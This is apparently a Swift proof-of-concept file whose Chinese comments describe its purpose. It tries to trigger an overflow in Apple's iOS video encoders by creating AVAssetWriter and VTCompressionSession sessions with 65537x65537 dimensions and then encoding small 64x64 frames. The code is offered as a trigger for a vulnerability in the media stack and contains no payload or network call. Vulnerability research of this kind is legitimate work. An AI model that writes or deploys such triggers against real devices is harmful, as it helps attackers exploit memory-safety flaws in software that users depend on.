// AVERunner.swift — v1: AVAssetWriter (修复 adaptor bug) + v2: VTCompressionSession (主触发路径)
// 修复: AVAssetWriterInputPixelBufferAdaptor 在 iOS 26 上 init 即崩, 改用 VTCompressionSession 直接驱动
import AVFoundation
import VideoToolbox

final class AVERunner {
    static let shared = AVERunner()
    private init() {}

    private let overflowW = 65537
    private let overflowH = 65537

    // ============ v1: AVAssetWriter (fixed adaptor) ============
    func start(_ report: @escaping (String) -> Void) {
        report("=== v1 AVAssetWriter \(overflowW)x\(overflowH) ===")
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("poc.mov")
        try? FileManager.default.removeItem(at: url)
        guard let writer = try? AVAssetWriter(url: url, fileType: .mov) else {
            report("AVAssetWriter init failed"); return
        }
        let settings: [String: Any] = [
            AVVideoCodecKey: AVVideoCodecType.h264,
            AVVideoWidthKey: overflowW,
            AVVideoHeightKey: overflowH,
            AVVideoCompressionPropertiesKey: [
                AVVideoAverageBitRateKey: 1_000_000,
                AVVideoMaxKeyFrameIntervalKey: 30,
            ],
        ]
        let input = AVAssetWriterInput(mediaType: .video, outputSettings: settings)
        guard writer.canAdd(input) else { report("cannot add input"); return }
        writer.add(input)

        // Fix: don't create adaptor before startWriting; use adaptor lazily
        writer.startWriting()
        writer.startSession(atSourceTime: .zero)
        report("session started")

        // Feed NORMAL 64x64 frame via adaptor (source attrs only format)
        let adaptor = AVAssetWriterInputPixelBufferAdaptor(
            assetWriterInput: input,
            sourcePixelBufferAttributes: [
                kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA,
            ])
        var pb: CVPixelBuffer?
        let cs = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                     kCVPixelFormatType_32BGRA, nil, &pb)
        if cs != kCVReturnSuccess { report("pb create failed \(cs)"); return }
        guard let p = pb else { report("pb nil"); return }
        report("adaptor append: \(adaptor.append(p, withPresentationTime: .zero))")
        input.markAsFinished()
        writer.finishWriting { report("writer finished: \(writer.status.rawValue) err=\(String(describing: writer.error))") }
        report("v1 done (wait for finish callback)")
    }

    // ============ v2: VTCompressionSession (primary trigger) ============
    func startV2(_ report: @escaping (String) -> Void) {
        report("=== v2 VTCompressionSession \(overflowW)x\(overflowH) ===")
        var session: VTCompressionSession?
        let status = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: Int32(overflowW),
            height: Int32(overflowH),
            codecType: kCMVideoCodecType_H264,
            encoderSpecification: nil,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: nil,
            refcon: nil,
            compressionSessionOut: &session
        )
        report("create status=\(status)")
        guard status == noErr, let s = session else {
            report("session create failed — dims rejected?")
            return
        }
        VTSessionSetProperty(s, key: kVTCompressionPropertyKey_AverageBitRate,
                             value: NSNumber(value: 1_000_000))
        VTSessionSetProperty(s, key: kVTCompressionPropertyKey_RealTime,
                             value: kCFBooleanTrue)
        VTSessionSetProperty(s, key: kVTCompressionPropertyKey_ProfileLevel,
                             value: kVTProfileLevel_H264_Baseline_AutoLevel)

        // Feed a 64x64 frame — encoder session carries overflow dims
        var pb: CVPixelBuffer?
        let ps = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                     kCVPixelFormatType_32BGRA, nil, &pb)
        report("pb create \(ps)")
        guard let p = pb else { report("pb nil"); return }
        var flags: VTEncodeInfoFlags = []
        let enc = VTCompressionSessionEncodeFrame(s, imageBuffer: p,
            presentationTimeStamp: CMTime(value: 0, timescale: 600),
            duration: CMTime(value: 1, timescale: 600),
            frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
        report("encodeFrame status=\(enc) flags=\(flags.rawValue)")
        // Try a second frame + flush
        let enc2 = VTCompressionSessionEncodeFrame(s, imageBuffer: p,
            presentationTimeStamp: CMTime(value: 1, timescale: 600),
            duration: CMTime(value: 1, timescale: 600),
            frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
        report("encodeFrame2 status=\(enc2)")
        VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        report("frames completed")
        VTCompressionSessionInvalidate(s)
        report("v2 done")
    }
}
